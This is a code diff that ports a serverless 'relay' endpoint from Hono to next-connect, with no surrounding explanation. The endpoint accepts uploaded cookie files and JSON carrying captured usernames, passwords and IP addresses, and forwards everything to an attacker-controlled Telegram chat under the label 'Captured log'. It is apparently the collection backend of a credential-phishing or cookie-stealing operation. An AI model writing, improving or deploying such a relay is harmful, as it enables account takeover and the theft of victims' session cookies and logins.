@@ -1,52 +1,94 @@
-import { Hono } from 'hono';
-// For Node.js compatibility (Vercel's Serverless Functions), import Blob and FormData from undici
-import { FormData, Blob, File } from 'undici';
+// api/relay.js
 
-// Vercel sets env vars as process.env (for Serverless, not Edge)
-const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN;
-const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
+import nextConnect from 'next-connect';
+import multer from 'multer';
+import FormData from 'form-data';
 
-const app = new Hono();
+export const config = { api: { bodyParser: false } };
 
-app.post(async (c) => {
-  // Parse the multipart form data (fields and files)
-  const form = await c.req.parseBody({ all: true });
-  const ip = form['ip'];
-  const type = form['type'];
-  const file = form['file'];
+const upload = multer();
+const handler = nextConnect();
 
-  if (!TELEGRAM_TOKEN || !TELEGRAM_CHAT_ID) {
-    return c.json({ success: false, error: 'Bot not configured' }, 500);
+handler.use(upload.single('file'));
+
+handler.post(async (req, res) => {
+  const telegramToken = process.env.TELEGRAM_TOKEN;
+  const chatId = process.env.TELEGRAM_CHAT_ID;
+
+  if (!telegramToken || !chatId) {
+    return res.status(500).json({ success: false, message: 'Bot not configured' });
+  }
+  const botUrl = `https://api.telegram.org/bot${telegramToken}`;
+
+  // --- 1. File upload (cookies as .txt) ---
+  if (req.file) {
+    const form = new FormData();
+    form.append('chat_id', chatId);
+    form.append(
+      'document',
+      req.file.buffer,
+      {
+        filename: req.file.originalname || 'cookie.txt',
+        contentType: req.file.mimetype || 'text/plain'
+      }
+    );
+    // Optional: add a caption with extra info (ip/type)
+    const { ip, type } = req.body;
+    let caption = '';
+    if (ip) caption += `IP: ${ip}\n`;
+    if (type) caption += `Type: ${type}\n`;
+    if (caption) form.append('caption', caption);
+
+    const tgRes = await fetch(`${botUrl}/sendDocument`, {
+      method: 'POST',
+      body: form,
+      headers: form.getHeaders()
+    });
+    const tgText = await tgRes.text();
+    if (!tgRes.ok) {
+      console.error('Telegram API error (file):', tgText);
+      return res.status(502).json({ success: false, error: tgText });
+    }
+    return res.status(200).json({ success: true });
   }
 
-  if (!file) {
-    return c.json({ success: false, error: 'No file received' }, 400);
+  // --- 2. JSON (credentials or logs) ---
+  if (req.headers['content-type']?.includes('application/json')) {
+    let body = '';
+    await new Promise((resolve, reject) => {
+      req.on('data', chunk => body += chunk);
+      req.on('end', resolve);
+      req.on('error', reject);
+    });
+    let json;
+    try {
+      json = JSON.parse(body);
+    } catch {
+      return res.status(400).json({ success: false, message: 'Invalid JSON' });
+    }
+    const { data, ip, user, pass, type } = json;
+    let text = `📥 Captured log\n`;
+    if (ip) text += `IP: ${ip}\n`;
+    if (type) text += `Type: ${type}\n`;
+    if (data) text += `\n${data}`;
+    else if (user && pass) text += `User: ${user}\nPass: ${pass}`;
+    else text += JSON.stringify(json, null, 2);
+
+    const tgRes = await fetch(`${botUrl}/sendMessage`, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: chatId, text })
+    });
+    const tgText = await tgRes.text();
+    if (!tgRes.ok) {
+      console.error('Telegram API error (text):', tgText);
+      return res.status(502).json({ success: false, error: tgText });
+    }
+    return res.status(200).json({ success: true });
   }
 
-  // Build the form for Telegram
-  const tgForm = new FormData();
-  tgForm.append('chat_id', TELEGRAM_CHAT_ID);
-  tgForm.append('document', file, file.name || 'cookies.txt');
-
-  // Optional: Add caption
-  let caption = '';
-  if (ip) caption += `IP: ${ip}\n`;
-  if (type) caption += `Type: ${type}\n`;
-  if (caption) tgForm.append('caption', caption);
-
-  // Send to Telegram
-  const tgRes = await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-    method: 'POST',
-    body: tgForm
-  });
-
-  if (!tgRes.ok) {
-    const errText = await tgRes.text();
-    return c.json({ success: false, error: errText }, 502);
-  }
-
-  return c.json({ success: true });
+  // --- 3. Any other payload type: error ---
+  return res.status(400).json({ success: false, message: 'Bad payload' });
 });
 
-// Required for Vercel's Serverless function export
-export default app.fetch;
+export default handler;
